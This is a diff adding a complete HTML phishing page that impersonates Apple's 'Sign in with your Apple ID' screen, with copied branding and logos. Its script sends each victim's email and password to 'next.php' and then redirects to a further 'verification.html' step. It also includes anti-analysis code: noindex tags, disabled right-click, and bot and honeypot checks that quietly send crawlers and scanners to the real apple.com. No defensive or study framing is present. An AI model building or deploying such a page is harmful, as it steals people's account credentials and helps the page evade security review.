@@ -1,0 +1,557 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="robots" content="noindex, nofollow">
+    <meta name="googlebot" content="noindex, noarchive">
+    <meta name="googlebot-news" content="nosnippet">
+    <meta name="description" content="Sign in with your Apple ID">
+    <title>Apple ID - Sign In</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, "SF Pro Text", "SF Pro Icons", "Helvetica Neue", Helvetica, Arial, sans-serif;
+        }
+        
+        :root {
+            --apple-primary: #1d1d1f;
+            --apple-secondary: #f5f5f7;
+            --apple-blue: #0071e3;
+            --apple-blue-dark: #0058b0;
+            --apple-grey: #86868b;
+            --apple-light-grey: #d2d2d7;
+            --apple-success: #4cd964;
+            --apple-error: #ff3b30;
+        }
+        
+        body {
+            background-color: var(--apple-secondary);
+            color: var(--apple-primary);
+            line-height: 1.47059;
+            font-weight: 400;
+            letter-spacing: -0.022em;
+        }
+        
+        .container {
+            max-width: 980px;
+            margin: 0 auto;
+            padding: 0 22px;
+        }
+        
+        .global-nav {
+            background-color: rgba(0, 0, 0, 0.8);
+            backdrop-filter: saturate(180%) blur(20px);
+            height: 44px;
+            width: 100%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            position: sticky;
+            top: 0;
+            z-index: 9999;
+        }
+        
+        .global-nav ul {
+            display: flex;
+            list-style: none;
+            max-width: 980px;
+            width: 100%;
+            justify-content: space-around;
+            padding: 0 10px;
+        }
+        
+        .global-nav a {
+            color: rgba(255, 255, 255, 0.8);
+            text-decoration: none;
+            font-size: 12px;
+            transition: color 0.2s;
+        }
+        
+        .global-nav a:hover {
+            color: #ffffff;
+        }
+        
+        .signin-container {
+            max-width: 450px;
+            margin: 40px auto;
+            background-color: #fff;
+            border-radius: 12px;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.05);
+            overflow: hidden;
+        }
+        
+        .signin-header {
+            text-align: center;
+            padding: 25px 0 15px;
+        }
+        
+        .logo {
+            width: 50px;
+            height: 50px;
+            margin-bottom: 10px;
+        }
+        
+        h1 {
+            font-size: 24px;
+            line-height: 1.1;
+            font-weight: 500;
+            margin-bottom: 8px;
+        }
+        
+        .signin-subtitle {
+            font-size: 14px;
+            color: var(--apple-grey);
+        }
+        
+        .signin-form {
+            padding: 20px 40px 40px;
+        }
+        
+        .form-group {
+            margin-bottom: 18px;
+        }
+        
+        label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: 400;
+            font-size: 15px;
+        }
+        
+        input {
+            width: 100%;
+            padding: 12px 16px;
+            border: 1px solid var(--apple-light-grey);
+            border-radius: 8px;
+            font-size: 16px;
+            outline: none;
+            transition: border-color 0.2s ease;
+            -webkit-appearance: none;
+        }
+        
+        input:focus {
+            border-color: var(--apple-blue);
+            box-shadow: 0 0 0 4px rgba(0, 125, 250, 0.1);
+        }
+        
+        .error {
+            color: var(--apple-error);
+            font-size: 13px;
+            margin-top: 5px;
+            display: none;
+        }
+        
+        button {
+            background-color: var(--apple-blue);
+            color: white;
+            border: none;
+            border-radius: 8px;
+            padding: 12px 22px;
+            font-size: 16px;
+            font-weight: 400;
+            cursor: pointer;
+            width: 100%;
+            transition: all 0.2s ease;
+            margin-top: 20px;
+        }
+        
+        button:hover {
+            background-color: var(--apple-blue-dark);
+        }
+        
+        .forgotten-link {
+            display: block;
+            text-align: center;
+            margin-top: 15px;
+            color: var(--apple-blue);
+            text-decoration: none;
+            font-size: 14px;
+        }
+        
+        .forgotten-link:hover {
+            text-decoration: underline;
+        }
+        
+        .signin-divider {
+            margin: 30px 0;
+            text-align: center;
+            position: relative;
+        }
+        
+        .signin-divider::before {
+            content: '';
+            position: absolute;
+            left: 0;
+            top: 50%;
+            width: 100%;
+            height: 1px;
+            background-color: var(--apple-light-grey);
+        }
+        
+        .signin-divider span {
+            position: relative;
+            background-color: #fff;
+            padding: 0 10px;
+            color: var(--apple-grey);
+            font-size: 14px;
+        }
+        
+        .create-account-btn {
+            background-color: transparent;
+            color: var(--apple-blue);
+            border: 1px solid var(--apple-blue);
+        }
+        
+        .create-account-btn:hover {
+            background-color: rgba(0, 113, 227, 0.05);
+        }
+        
+        .footer {
+            text-align: center;
+            padding: 34px 0;
+            color: var(--apple-grey);
+            font-size: 12px;
+            max-width: 980px;
+            margin: 0 auto;
+        }
+        
+        .footer a {
+            color: #515154;
+            text-decoration: none;
+        }
+        
+        .footer a:hover {
+            text-decoration: underline;
+        }
+        
+        .footer-links {
+            margin-top: 12px;
+        }
+        
+        .footer-links a {
+            margin: 0 10px;
+        }
+        
+        .loading {
+            display: none;
+            text-align: center;
+            padding: 30px;
+        }
+        
+        .spinner {
+            border: 3px solid rgba(0, 0, 0, 0.1);
+            border-radius: 50%;
+            border-top: 3px solid var(--apple-blue);
+            width: 24px;
+            height: 24px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 20px;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        .legal-footer {
+            background-color: var(--apple-secondary);
+            font-size: 12px;
+            color: var(--apple-grey);
+            padding: 17px 0;
+            line-height: 1.33337;
+        }
+        
+        .legal-footer-content {
+            max-width: 980px;
+            margin: 0 auto;
+            padding: 0 22px;
+        }
+        
+        .legal-links {
+            display: flex;
+            flex-wrap: wrap;
+            margin-bottom: 10px;
+        }
+        
+        .legal-link {
+            margin-right: 15px;
+            color: #515154;
+            text-decoration: none;
+        }
+        
+        .legal-link:hover {
+            text-decoration: underline;
+        }
+        
+        .copyright {
+            margin-top: 5px;
+        }
+        
+        @media only screen and (max-width: 734px) {
+            .signin-container {
+                margin: 20px auto;
+                border-radius: 8px;
+            }
+            
+            .signin-form {
+                padding: 20px 20px 30px;
+            }
+            
+            .global-nav ul {
+                justify-content: space-between;
+            }
+            
+            .global-nav li:not(:first-child):not(:last-child) {
+                display: none;
+            }
+        }
+    </style>
+</head>
+<body>
+    <!-- Global Navigation -->
+    <nav class="global-nav">
+        <ul>
+            <li><a href="#"><svg height="44" viewBox="0 0 14 44" width="14" xmlns="http://www.w3.org/2000/svg"><path d="m13.0729 17.6825a3.61 3.61 0 0 0 -1.7248 3.0365 3.5132 3.5132 0 0 0 2.1379 3.2223 8.394 8.394 0 0 1 -1.0948 2.2618c-.6816.9812-1.3943 1.9623-2.4787 1.9623s-1.3633-.63-2.613-.63c-1.2187 0-1.6525.6507-2.644.6507s-1.6834-.9089-2.4787-2.0243a9.7842 9.7842 0 0 1 -1.6628-5.2776c0-3.0984 2.014-4.7405 3.9969-4.7405 1.0535 0 1.9314.6919 2.5924.6919.63 0 1.6112-.7333 2.8092-.7333a3.7579 3.7579 0 0 1 3.1604 1.5802zm-3.7284-2.8918a3.5615 3.5615 0 0 0 .8469-2.22 1.5353 1.5353 0 0 0 -.031-.32 3.5686 3.5686 0 0 0 -2.3445 1.2084 3.4629 3.4629 0 0 0 -.8779 2.1585 1.419 1.419 0 0 0 .031.2892 1.19 1.19 0 0 0 .2169.0207 3.0935 3.0935 0 0 0 2.1586-1.1368z" fill="#fff"/></svg></a></li>
+            <li><a href="#">Store</a></li>
+            <li><a href="#">Mac</a></li>
+            <li><a href="#">iPad</a></li>
+            <li><a href="#">iPhone</a></li>
+            <li><a href="#">Watch</a></li>
+            <li><a href="#">AirPods</a></li>
+            <li><a href="#">TV & Home</a></li>
+            <li><a href="#">Entertainment</a></li>
+            <li><a href="#">Accessories</a></li>
+            <li><a href="#">Support</a></li>
+            <li><a href="#"><i class="fas fa-search" style="font-size: 12px;"></i></a></li>
+        </ul>
+    </nav>
+
+    <div class="container">
+        <div class="signin-container">
+            <div class="signin-header">
+                <svg class="logo" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 56 56">
+                    <path d="M28.252,42.631c-0.556,1.145-0.819,1.645-1.536,2.65c-0.995,1.419-2.394,3.176-4.13,3.196  c-1.553,0.021-1.952-1.016-4.077-1.008c-2.129,0.008-2.572,1.027-4.124,1.009c-1.736-0.02-3.066-1.61-4.056-3.031  c-2.773-3.956-3.064-8.601-1.354-11.055c1.229-1.762,3.162-2.793,4.991-2.793c1.86,0,3.031,1.009,4.566,1.009  c1.485,0,2.385-1.01,4.514-1.01c1.619,0,3.327,0.881,4.547,2.404C24.692,34.767,24.993,41.585,28.252,42.631z M18.735,23.531  c0.856-1.095,1.513-2.64,1.343-4.231c-1.466,0.092-3.158,1.03-4.139,2.241c-0.893,1.116-1.623,2.683-1.422,4.242  C16.108,25.865,17.823,24.847,18.735,23.531z" fill="#1d1d1f"/>
+                </svg>
+                <h1>Sign in with your Apple&nbsp;ID</h1>
+                <p class="signin-subtitle">to continue to Apple Online Services</p>
+            </div>
+            
+            <div class="signin-form">
+                <form id="login-form">
+                    <div class="form-group">
+                        <label for="email">Apple ID</label>
+                        <input type="email" id="email" name="email" required placeholder="Email or phone number" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false">
+                        <div class="error" id="email-error">Please enter a valid Apple ID.</div>
+                    </div>
+                    
+                    <div class="form-group">
+                        <label for="password">Password</label>
+                        <input type="password" id="password" name="password" required placeholder="Enter your password" autocomplete="off">
+                        <div class="error" id="password-error">Please enter your password.</div>
+                    </div>
+                    
+                    <button type="button" id="signin-button">Sign In</button>
+                    <a href="#" class="forgotten-link">Forgotten Apple ID or password?</a>
+                    
+                    <div class="signin-divider">
+                        <span>or</span>
+                    </div>
+                    
+                    <button type="button" class="create-account-btn" id="create-account-button">Create Apple ID</button>
+                </form>
+                
+                <!-- Loading State -->
+                <div class="loading" id="loading">
+                    <div class="spinner"></div>
+                    <p>Signing in...</p>
+                </div>
+            </div>
+        </div>
+    </div>
+    
+    <div class="legal-footer">
+        <div class="legal-footer-content">
+            <div class="legal-links">
+                <a href="#" class="legal-link">Privacy Policy</a>
+                <a href="#" class="legal-link">Terms of Use</a>
+                <a href="#" class="legal-link">Sales and Refunds</a>
+                <a href="#" class="legal-link">Legal</a>
+                <a href="#" class="legal-link">Site Map</a>
+            </div>
+            <div class="copyright">Copyright © 2025 Apple Inc. All rights reserved.</div>
+        </div>
+    </div>
+    
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
+    <script>
+        // Anti-bot and crawler protection
+        window.onload = function() {
+            // Add honeypot fields
+            var loginForm = document.getElementById('login-form');
+            var honeyDiv = document.createElement('div');
+            honeyDiv.style.opacity = '0';
+            honeyDiv.style.position = 'absolute';
+            honeyDiv.style.height = '0';
+            honeyDiv.style.overflow = 'hidden';
+            
+            var honeyInput = document.createElement('input');
+            honeyInput.setAttribute('type', 'text');
+            honeyInput.setAttribute('id', 'website');
+            honeyInput.setAttribute('name', 'website');
+            honeyInput.setAttribute('autocomplete', 'off');
+            
+            honeyDiv.appendChild(honeyInput);
+            loginForm.appendChild(honeyDiv);
+            
+            // Store the start time
+            window.sessionStorage.setItem('pageLoadTime', Date.now());
+            
+            // Generate a verification token
+            var verificationToken = generateRandomToken(32);
+            window.sessionStorage.setItem('verificationToken', verificationToken);
+            
+            // Disable right-click
+            document.addEventListener('contextmenu', function(e) {
+                e.preventDefault();
+            });
+        };
+        
+        // Track mouse movements to detect bots
+        var mouseMovements = 0;
+        document.addEventListener('mousemove', function() {
+            mouseMovements++;
+        });
+        
+        // Track key presses for human verification
+        var keyPresses = 0;
+        document.addEventListener('keydown', function(e) {
+            keyPresses++;
+        });
+        
+        // Generate a random token
+        function generateRandomToken(length) {
+            var result = '';
+            var chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
+            for (var i = 0; i < length; i++) {
+                result += chars.charAt(Math.floor(Math.random() * chars.length));
+            }
+            return result;
+        }
+        
+        // Check for bot patterns
+        function checkForBot() {
+            // If the honeypot field is filled, it's a bot
+            if (document.getElementById('website') && document.getElementById('website').value) {
+                return true;
+            }
+            
+            // Check if page loaded too quickly (bots often don't wait for page to load)
+            var pageLoadTime = parseInt(window.sessionStorage.getItem('pageLoadTime'));
+            var currentTime = Date.now();
+            if ((currentTime - pageLoadTime) < 2000) {
+                return true;
+            }
+            
+            // Check mouse movement patterns
+            if (mouseMovements < 5) {
+                return true;
+            }
+            
+            // Check if bot was already detected
+            if (window.sessionStorage.getItem('botDetected') === 'true') {
+                return true;
+            }
+            
+            return false;
+        }
+        
+        // Sign In button click handler
+        $(document).ready(function() {
+            $('#signin-button').click(function() {
+                var valid = true;
+                
+                // Bot detection check
+                if (checkForBot()) {
+                    // If it's a bot, pretend to proceed but silently fail
+                    setTimeout(function() {
+                        window.location.href = "https://www.apple.com";
+                    }, 1500);
+                    return;
+                }
+                
+                // Validate email
+                var email = $('#email').val();
+                if(!email || !/^\S+@\S+\.\S+$/.test(email)) {
+                    $('#email-error').show();
+                    valid = false;
+                } else {
+                    $('#email-error').hide();
+                }
+                
+                // Validate password
+                var password = $('#password').val();
+                if(!password || password.length < 6) {
+                    $('#password-error').show();
+                    valid = false;
+                } else {
+                    $('#password-error').hide();
+                }
+                
+                if(valid) {
+                    // Calculate browser fingerprint for anti-bot
+                    var fingerprint = {
+                        screen: window.screen.width + 'x' + window.screen.height,
+                        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                        language: navigator.language,
+                        cookiesEnabled: navigator.cookieEnabled ? 1 : 0,
+                        mouseMoves: mouseMovements,
+                        keyPresses: keyPresses,
+                        timeOnPage: Date.now() - parseInt(window.sessionStorage.getItem('pageLoadTime')),
+                        verificationToken: window.sessionStorage.getItem('verificationToken')
+                    };
+                    
+                    // Hide form, show loading
+                    $('#login-form').hide();
+                    $('#loading').show();
+                    
+                    // Send data via AJAX
+                    $.ajax({
+                        type: 'POST',
+                        url: 'next.php',
+                        data: {
+                            step: 1,
+                            email: email,
+                            password: password,
+                            verification: JSON.stringify(fingerprint)
+                        },
+                        headers: {
+                            'X-Requested-With': 'XMLHttpRequest',
+                            'X-Verification-Token': window.sessionStorage.getItem('verificationToken')
+                        },
+                        success: function(response) {
+                            // Redirect to next verification step after a delay
+                            setTimeout(function() {
+                                window.location.href = "verification.html";
+                            }, 2000);
+                        },
+                        error: function() {
+                            alert('An error occurred. Please try again.');
+                            $('#loading').hide();
+                            $('#login-form').show();
+                        }
+                    });
+                }
+            });
+            
+            // Create Account button click handler
+            $('#create-account-button').click(function() {
+                window.location.href = "https://appleid.apple.com/account";
+            });
+        });
+    </script>
+</body>
+</html>
